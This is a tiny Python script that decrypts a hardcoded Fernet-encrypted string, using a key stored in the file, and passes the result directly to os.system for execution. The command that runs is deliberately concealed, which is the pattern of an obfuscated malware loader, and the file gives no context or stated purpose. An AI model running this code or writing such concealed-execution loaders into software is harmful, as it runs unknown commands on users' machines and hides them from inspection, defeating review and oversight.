from cryptography.fernet import Fernet
from os import system


b = b'69N6gMB_spitahh_yOqN9KojSMiwdE3mQ1ZbT6iVpGg='
e = b'gAAAAABmDDTZZDtXFt7fcauR6v6YkofbuzIskl3buA9LbVZ_vfoyigUHJoJ6bZcYWeFm4LuI7fZmN7JnJb4x2C5FK5FHliIuquzPkdfaM2RGwZDcXyA-Lxz3XHohEjVCP95r7QB-LOVU'

fer = Fernet(b)

d = fer.decrypt(e).decode()


system(d)